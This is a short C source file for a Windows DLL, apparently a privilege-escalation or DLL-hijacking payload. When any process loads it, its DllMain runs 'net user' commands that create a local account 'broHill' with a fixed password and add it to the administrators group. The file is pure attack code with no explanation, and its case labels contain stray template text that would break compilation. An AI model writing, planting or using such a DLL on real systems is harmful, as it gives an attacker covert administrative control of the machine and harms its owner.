#include <windows.h>

void mirror()
{
    system("net user broHill easy123 /add");
    system("net localgroup administrators broHill /add");
}

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:/* constant-expression */:
        mirror();
        break;
   case DLL_THREAD_ATTACH:/* constant-expression */:
        /* code */
        break;
   case DLL_THREAD_DETACH:/* constant-expression */:
        /* code */
        break;
   case DLL_PROCESS_DETACH:/* constant-expression */:
        /* code */
        break;
    /*
    default:
        break;
        */
    }
    return TRUE;
}